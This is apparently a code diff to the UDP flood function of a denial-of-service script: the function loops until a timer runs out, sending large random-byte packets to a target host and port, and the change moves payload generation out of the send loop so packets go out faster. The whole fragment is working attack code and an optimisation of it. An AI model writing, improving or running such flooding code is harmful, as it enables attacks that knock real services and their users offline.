@@ -257,8 +257,8 @@ def udp(event, timer):
     while time.time() < timer:
         try:
             try:
+                data = random._urandom(int(Intn(1024, 60000)))
                 for _ in range(multiple):
-                    data = random._urandom(int(Intn(1024, 60000)))
                     s.sendto(data, (str(target), int(port)))
             except:
                 s.close()
